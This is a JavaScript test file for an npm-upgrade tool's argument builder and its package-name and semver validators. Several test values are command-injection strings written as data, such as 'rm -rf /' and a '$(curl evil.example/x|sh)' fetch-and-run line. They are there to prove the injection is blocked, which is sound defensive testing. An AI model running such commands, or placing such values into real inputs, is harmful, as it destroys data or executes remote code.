/**
 * Pure argument construction for the Upgrade action's npm task. The point of
 * this file: prove the argv is always an array of literal elements — never a
 * shell string — so a hostile package name or version can never smuggle a
 * second command in, regardless of what characters it contains.
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';

import {
  buildNpmInstallArgs,
  isMajorUpgrade,
  isSafeNpmPackageName,
  isSafeSemverVersion,
} from '../out/core/upgrade/plan.js';

// ------------------------------------------------------------- save flags

test('a prod dependency gets --save-prod', () => {
  const args = buildNpmInstallArgs({
    packageName: 'left-pad',
    target: '2.0.0',
    classification: 'prod',
    ignoreScripts: false,
  });
  assert.deepEqual(args, ['install', 'left-pad@2.0.0', '--save-prod']);
});

test('a dev dependency gets --save-dev', () => {
  const args = buildNpmInstallArgs({
    packageName: 'eslint',
    target: '9.0.0',
    classification: 'dev',
    ignoreScripts: false,
  });
  assert.deepEqual(args, ['install', 'eslint@9.0.0', '--save-dev']);
});

test('an optional dependency gets --save-optional', () => {
  const args = buildNpmInstallArgs({
    packageName: 'fsevents',
    target: '2.3.3',
    classification: 'optional',
    ignoreScripts: false,
  });
  assert.deepEqual(args, ['install', 'fsevents@2.3.3', '--save-optional']);
});

// ------------------------------------------------------------ ignoreScripts

test('ignoreScripts true appends --ignore-scripts, for every classification', () => {
  for (const classification of ['prod', 'dev', 'optional']) {
    const args = buildNpmInstallArgs({
      packageName: 'pkg',
      target: '1.0.0',
      classification,
      ignoreScripts: true,
    });
    assert.ok(args.includes('--ignore-scripts'), `expected --ignore-scripts for ${classification}`);
    assert.equal(args[args.length - 1], '--ignore-scripts');
  }
});

test('ignoreScripts false omits the flag entirely', () => {
  const args = buildNpmInstallArgs({
    packageName: 'pkg',
    target: '1.0.0',
    classification: 'prod',
    ignoreScripts: false,
  });
  assert.ok(!args.includes('--ignore-scripts'));
});

// -------------------------------------------------------- argv is an array

test('a package name with shell metacharacters stays a single argv element', () => {
  const hostile = 'pkg; rm -rf / #';
  const args = buildNpmInstallArgs({
    packageName: hostile,
    target: '1.0.0',
    classification: 'prod',
    ignoreScripts: false,
  });
  // The whole hostile string is one element of the array, glued to the
  // version with '@' — never split into separate argv entries the way a
  // shell would tokenize it.
  assert.deepEqual(args, ['install', `${hostile}@1.0.0`, '--save-prod']);
  assert.equal(args.length, 3);
});

test('a target containing shell metacharacters also stays a single element', () => {
  const hostileTarget = '$(curl evil.example/x|sh)';
  const args = buildNpmInstallArgs({
    packageName: 'pkg',
    target: hostileTarget,
    classification: 'dev',
    ignoreScripts: true,
  });
  assert.deepEqual(args, ['install', `pkg@${hostileTarget}`, '--save-dev', '--ignore-scripts']);
});

test('a package name with backticks and quotes stays inert as plain text', () => {
  const hostile = '`whoami`"\'&&echo pwned';
  const args = buildNpmInstallArgs({
    packageName: hostile,
    target: '1.0.0',
    classification: 'optional',
    ignoreScripts: false,
  });
  assert.equal(args[1], `${hostile}@1.0.0`);
});

// ----------------------------------------------------------- major upgrade

test('a major version bump is detected', () => {
  assert.equal(isMajorUpgrade('1.2.3', '2.0.0'), true);
});

test('a minor/patch bump is not a major upgrade', () => {
  assert.equal(isMajorUpgrade('1.2.3', '1.3.0'), false);
  assert.equal(isMajorUpgrade('1.2.3', '1.2.4'), false);
});

// --------------------------------------------------- identifier validation

test('ordinary and scoped package names are safe', () => {
  assert.equal(isSafeNpmPackageName('left-pad'), true);
  assert.equal(isSafeNpmPackageName('@babel/core'), true);
  assert.equal(isSafeNpmPackageName('lodash.merge'), true);
});

test('a name carrying shell metacharacters is rejected outright', () => {
  assert.equal(isSafeNpmPackageName('pkg; rm -rf /'), false);
  assert.equal(isSafeNpmPackageName('$(whoami)'), false);
  assert.equal(isSafeNpmPackageName(''), false);
});

test('a valid semver string is a safe version; anything else is not', () => {
  assert.equal(isSafeSemverVersion('1.2.3'), true);
  assert.equal(isSafeSemverVersion('2.0.0-beta.1'), true);
  assert.equal(isSafeSemverVersion('$(whoami)'), false);
  assert.equal(isSafeSemverVersion('latest'), false);
});
